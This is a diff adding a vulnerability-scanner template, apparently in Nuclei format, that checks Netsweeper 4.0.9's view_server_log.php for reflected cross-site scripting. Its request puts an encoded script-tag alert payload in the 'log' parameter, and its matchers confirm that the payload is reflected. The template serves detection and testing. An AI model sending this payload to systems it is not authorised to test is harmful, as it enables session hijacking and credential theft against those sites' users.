@@ -1,0 +1,28 @@
+id: netsweeper-rxss
+name: Netsweeper 4.0.9 - Cross-Site Scripting
+severity: high
+confidence: tentative
+description: Netsweeper 4.0.9 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the
+  browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication
+  credentials and launch other attacks.
+reference: CWE-79
+tags:
+- edb
+- xss
+- packetstorm
+- netsweeper
+- vuln
+requests:
+- method: GET
+  path: /webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter=
+  matchers:
+  - type: body
+    words:
+    - </script><script>alert(document.domain)</script>
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
